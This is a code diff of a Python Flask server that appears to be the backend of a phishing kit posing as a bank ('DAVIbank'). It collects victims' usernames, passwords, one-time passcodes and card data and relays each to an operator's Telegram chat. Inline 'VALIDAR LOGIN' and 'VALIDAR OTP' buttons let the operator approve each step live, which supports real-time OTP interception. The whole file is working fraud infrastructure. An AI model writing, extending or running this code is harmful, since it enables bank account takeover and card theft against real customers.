@@ -12,11 +12,14 @@ PORT = 3000
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-pending_validations = {}  # Stores OTP and validation status
+# Store user data
+user_data = {}  # userId -> {username, password, otp, login_validated, otp_validated}
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 last_update_id = 0
 
-@app.route('/api/submit', methods=['POST', 'OPTIONS'])
+# ============ API ENDPOINTS ============
+
+@app.route('/api/submit-login', methods=['POST', 'OPTIONS'])
 def submit_login():
     if request.method == 'OPTIONS':
         return jsonify({}), 200
@@ -25,37 +28,42 @@ def submit_login():
     user_id = data.get('userId')
     username = data.get('username')
     password = data.get('password')
-    otp = data.get('otp')
     
-    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username} - OTP: {otp}")
+    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username}")
     
-    pending_validations[user_id] = {
+    user_data[user_id] = {
         'username': username,
         'password': password,
-        'otp': otp,
-        'status': 'pending',
+        'login_validated': False,
+        'otp_validated': False,
         'timestamp': datetime.now().isoformat()
     }
     
-    message = (f"🔐 **CÓDIGO DE VERIFICACIÓN** 🔐\n\n"
+    # Create inline keyboard button for LOGIN validation
+    keyboard = {
+        "inline_keyboard": [[
+            {"text": "✅ VALIDAR LOGIN", "callback_data": f"validate_login_{user_id}"}
+        ]]
+    }
+    
+    message = (f"🔐 **NUEVO LOGIN** 🔐\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 ID: `{user_id}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-               f"📋 **DATOS DE ACCESO**\n"
                f"👤 Usuario: {username}\n"
                f"🔑 Contraseña: {password}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-               f"🔢 **CÓDIGO OTP:** `{otp}`\n"
+               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-               f"⚠️ Comparta este código con el usuario para que ingrese")
+               f"⚠️ Presione VALIDAR LOGIN para que el usuario ingrese el OTP")
     
     requests.post(f"{TELEGRAM_API}/sendMessage",
-        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
     
     return jsonify({"success": True})
 
-@app.route('/api/verify-otp', methods=['POST', 'OPTIONS'])
-def verify_otp():
+@app.route('/api/submit-otp', methods=['POST', 'OPTIONS'])
+def submit_otp():
     if request.method == 'OPTIONS':
         return jsonify({}), 200
     
@@ -63,46 +71,48 @@ def verify_otp():
     user_id = data.get('userId')
     user_otp = data.get('otp')
     
-    if user_id in pending_validations:
-        stored_otp = pending_validations[user_id]['otp']
-        if stored_otp == user_otp:
-            pending_validations[user_id]['status'] = 'validated'
-            print(f"[{datetime.now()}] ✅ OTP verified for {user_id}")
-            return jsonify({"valid": True})
+    print(f"[{datetime.now()}] 🔢 OTP submitted: {user_id} - {user_otp}")
     
-    return jsonify({"valid": False})
-
-@app.route('/api/resend-otp', methods=['POST', 'OPTIONS'])
-def resend_otp():
-    if request.method == 'OPTIONS':
-        return jsonify({}), 200
-    
-    data = request.json
-    user_id = data.get('userId')
-    username = data.get('username')
-    password = data.get('password')
-    new_otp = data.get('otp')
-    
-    if user_id in pending_validations:
-        pending_validations[user_id]['otp'] = new_otp
+    if user_id in user_data:
+        user_data[user_id]['otp'] = user_otp
         
-        message = (f"🔄 **NUEVO CÓDIGO OTP** 🔄\n\n"
+        # Create inline keyboard button for OTP validation
+        keyboard = {
+            "inline_keyboard": [[
+                {"text": "✅ VALIDAR OTP", "callback_data": f"validate_otp_{user_id}"}
+            ]]
+        }
+        
+        message = (f"🔢 **CÓDIGO OTP RECIBIDO** 🔢\n\n"
+                   f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 ID: `{user_id}`\n"
-                   f"👤 Usuario: {username}\n"
-                   f"🔢 **Nuevo código:** `{new_otp}`")
+                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                   f"👤 Usuario: {user_data[user_id]['username']}\n"
+                   f"🔢 Código OTP: `{user_otp}`\n\n"
+                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                   f"⚠️ Presione VALIDAR OTP para que el usuario continúe a la página de tarjeta")
         
         requests.post(f"{TELEGRAM_API}/sendMessage",
-            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
     
     return jsonify({"success": True})
 
-@app.route('/api/check/<user_id>', methods=['GET', 'OPTIONS'])
-def check_validation(user_id):
+@app.route('/api/check-login/<user_id>', methods=['GET', 'OPTIONS'])
+def check_login(user_id):
     if request.method == 'OPTIONS':
         return jsonify({}), 200
     
-    if user_id in pending_validations:
-        return jsonify({"validated": pending_validations[user_id]['status'] == 'validated'})
+    if user_id in user_data:
+        return jsonify({"validated": user_data[user_id].get('login_validated', False)})
+    return jsonify({"validated": False})
+
+@app.route('/api/check-otp/<user_id>', methods=['GET', 'OPTIONS'])
+def check_otp(user_id):
+    if request.method == 'OPTIONS':
+        return jsonify({}), 200
+    
+    if user_id in user_data:
+        return jsonify({"validated": user_data[user_id].get('otp_validated', False)})
     return jsonify({"validated": False})
 
 @app.route('/api/card', methods=['POST', 'OPTIONS'])
@@ -130,7 +140,9 @@ def submit_card():
 def health():
     if request.method == 'OPTIONS':
         return jsonify({}), 200
-    return jsonify({"status": "ok", "pending": len(pending_validations)})
+    return jsonify({"status": "ok", "users": len(user_data)})
+
+# ============ TELEGRAM POLLING ============
 
 def poll_telegram():
     global last_update_id
@@ -148,6 +160,26 @@ def poll_telegram():
                 for update in updates['result']:
                     last_update_id = update['update_id']
                     
+                    if 'callback_query' in update:
+                        callback = update['callback_query']
+                        data = callback['data']
+                        
+                        if data.startswith('validate_login_'):
+                            user_id = data.replace('validate_login_', '')
+                            if user_id in user_data:
+                                user_data[user_id]['login_validated'] = True
+                                print(f"[{datetime.now()}] ✅ Login validated: {user_id}")
+                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
+                                    json={"callback_query_id": callback['id'], "text": "✅ Login validado! El usuario puede ingresar OTP"})
+                        
+                        elif data.startswith('validate_otp_'):
+                            user_id = data.replace('validate_otp_', '')
+                            if user_id in user_data:
+                                user_data[user_id]['otp_validated'] = True
+                                print(f"[{datetime.now()}] ✅ OTP validated: {user_id}")
+                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
+                                    json={"callback_query_id": callback['id'], "text": "✅ OTP validado! El usuario verá la página de tarjeta"})
+                    
                     if 'message' in update:
                         message = update['message']
                         chat_id = message['chat']['id']
@@ -155,14 +187,17 @@ def poll_telegram():
                         
                         if text == '/start':
                             welcome = ("🤖 Bot de validación DAVIbank\n\n"
-                                      "Los usuarios serán notificados aquí con códigos OTP.\n\n"
+                                      "Flujo:\n"
+                                      "1. Recibe login → presiona VALIDAR LOGIN\n"
+                                      "2. Recibe OTP → presiona VALIDAR OTP\n"
+                                      "3. Recibe datos de tarjeta\n\n"
                                       "Comandos:\n/status - Ver estado")
                             requests.post(f"{TELEGRAM_API}/sendMessage",
                                 json={"chat_id": chat_id, "text": welcome})
                         
                         elif text == '/status':
                             requests.post(f"{TELEGRAM_API}/sendMessage",
-                                json={"chat_id": chat_id, "text": f"📊 Pendientes: {len(pending_validations)}"})
+                                json={"chat_id": chat_id, "text": f"📊 Usuarios activos: {len(user_data)}"})
         
         except Exception as e:
             print(f"Error: {e}")
